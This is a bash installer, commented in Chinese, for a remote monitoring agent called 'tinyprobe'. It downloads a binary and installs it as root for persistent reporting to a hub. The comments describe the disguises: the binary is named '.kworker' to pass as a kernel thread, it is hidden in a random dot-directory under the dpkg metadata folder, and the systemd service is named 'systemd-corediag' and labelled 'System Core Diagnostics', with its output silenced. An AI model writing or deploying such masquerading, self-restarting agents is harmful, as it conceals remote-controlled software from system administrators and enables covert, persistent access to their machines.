#!/bin/bash
# tinyprobe 极密安装脚本
# 特点：隐藏路径 + 随机后缀 + 伪装进程/服务名 + token 存 root-only 文件（ps 看不到明文）
# 用法: HUB=http://IP:47821 NAME=web-01 TOKEN=secret bash install.sh

set -e

HUB="${HUB:-http://127.0.0.1:47821}"
NAME="${NAME:-$(hostname)}"
TOKEN="${TOKEN:-}"
REPO="${REPO:-https://github.com/songyouxi/tinyprobe/releases/download}"
VERSION="${VERSION:-latest}"
INTERVAL="${INTERVAL:-2}"

# 隐蔽参数：伪装成系统诊断组件
SERVICE="${SERVICE:-systemd-corediag}"          # 服务名
BIN_NAME="${BIN_NAME:-.kworker}"                # 进程/二进制名（像内核线程）
BASE_DIR="${BASE_DIR:-/var/lib/dpkg/info}"      # 藏在 dpkg 元数据目录
DIR_SEED="${DIR_SEED:-corediag-$(od -An -tx1 -N6 /dev/urandom 2>/dev/null | tr -d ' \n')}"
HIDDEN_DIR="$BASE_DIR/.$DIR_SEED"
BIN_PATH="$HIDDEN_DIR/$BIN_NAME"
ENV_FILE="$HIDDEN_DIR/.conf"

while [ $# -gt 0 ]; do
  case "$1" in
    --hub) HUB="$2"; shift 2;; --name) NAME="$2"; shift 2;; --token) TOKEN="$2"; shift 2;;
    --repo) REPO="$2"; shift 2;; --version) VERSION="$2"; shift 2;;
    --interval) INTERVAL="$2"; shift 2;; --service) SERVICE="$2"; shift 2;;
    *) shift;;
  esac
done

detect_arch() {
  case "$(uname -m 2>/dev/null || echo unknown)" in
    x86_64|amd64) echo amd64;; aarch64|arm64) echo arm64;;
    i386|i486|i586|i686|386) echo 386;; armv7*|armv6*|arm) echo arm;;
    mips64el) echo mips64le;; mips64) echo mips64;; mipsel) echo mipsle;; mips) echo mips;;
    ppc64le|powerpc64le) echo ppc64le;; s390x) echo s390x;; riscv64) echo riscv64;;
    loongarch64|loong64) echo loong64;; *) echo amd64;;
  esac
}
ARCH=$(detect_arch)
REPO="${REPO%/}"
FILE="probe-linux-$ARCH"
if [ "$VERSION" = "latest" ]; then BASE_URL="$REPO/$FILE"; SUMS_URL="$REPO/SHA256SUMS";
else BASE_URL="$REPO/$VERSION/$FILE"; SUMS_URL="$REPO/$VERSION/SHA256SUMS"; fi

download() {
  if command -v curl >/dev/null 2>&1; then curl -fsSL --retry 3 --connect-timeout 10 "$1" -o "$2"
  elif command -v wget >/dev/null 2>&1; then wget -q -O "$2" "$1"
  else echo "需要 curl 或 wget" >&2; return 1; fi
}

TMP=$(mktemp -d 2>/dev/null || echo /tmp/.cd.$$)
trap 'rm -rf "$TMP"' EXIT
if ! download "$BASE_URL" "$TMP/$FILE"; then echo "下载失败: $BASE_URL" >&2; exit 1; fi
chmod +x "$TMP/$FILE"

if download "$SUMS_URL" "$TMP/SHA256SUMS" 2>/dev/null && command -v sha256sum >/dev/null 2>&1; then
  EXPECT=$(awk -v f="$FILE" '$2==f || $2=="./"f {print $1; exit}' "$TMP/SHA256SUMS")
  ACTUAL=$(sha256sum "$TMP/$FILE" | awk '{print $1}')
  if [ -n "$EXPECT" ] && [ "$ACTUAL" != "$EXPECT" ]; then echo "SHA256 校验失败" >&2; exit 1; fi
fi

# 安装到隐秘目录（需 root）
SUDO=""
[ "$(id -u)" -ne 0 ] && SUDO="sudo -n"
$SUDO mkdir -p "$HIDDEN_DIR"
$SUDO cp -f "$TMP/$FILE" "$BIN_PATH"
# 二进制伪装为 root 拥有、仅 root 可执行
$SUDO chown -R root:root "$HIDDEN_DIR"
$SUDO chmod 700 "$HIDDEN_DIR"
$SUDO chmod 111 "$BIN_PATH"

# root-only 环境文件：token 不出现在命令行/ps
TMPENV="$TMP/.conf"
{
  echo "# tinyprobe private env"
  echo "TP_HUB=$HUB"
  echo "TP_NAME=$NAME"
  echo "TP_TOKEN=$TOKEN"
  echo "TP_SERVICE=$SERVICE"
  echo "TP_INTERVAL=$INTERVAL"
} > "$TMPENV"
$SUDO cp -f "$TMPENV" "$ENV_FILE"
$SUDO chown root:root "$ENV_FILE"
$SUDO chmod 600 "$ENV_FILE"

# systemd 服务：ExecStart 只有隐秘路径 + envfile，无明文 token
if command -v systemctl >/dev/null 2>&1 && [ -d /run/systemd/system ]; then
  UNIT="/etc/systemd/system/$SERVICE.service"
  TMPUNIT="$TMP/.unit"
  cat > "$TMPUNIT" <<EOF
[Unit]
Description=System Core Diagnostics
After=network-online.target
Wants=network-online.target
[Service]
Type=simple
ExecStart=$BIN_PATH -envfile $ENV_FILE
Restart=always
RestartSec=5
MemoryMax=32M
CPUQuota=10%
NoNewPrivileges=true
StandardOutput=null
StandardError=null
[Install]
WantedBy=multi-user.target
EOF
  $SUDO cp -f "$TMPUNIT" "$UNIT"
  $SUDO chmod 644 "$UNIT"
  $SUDO systemctl daemon-reload
  $SUDO systemctl enable "$SERVICE" >/dev/null 2>&1 || true
  $SUDO systemctl restart "$SERVICE"
  echo "== 完成: service=$SERVICE path=$HIDDEN_DIR (root-only)"
else
  $SUDO setsid "$BIN_PATH" -envfile "$ENV_FILE" >/dev/null 2>&1 < /dev/null &
  echo "== 完成(no-systemd): path=$HIDDEN_DIR"
fi
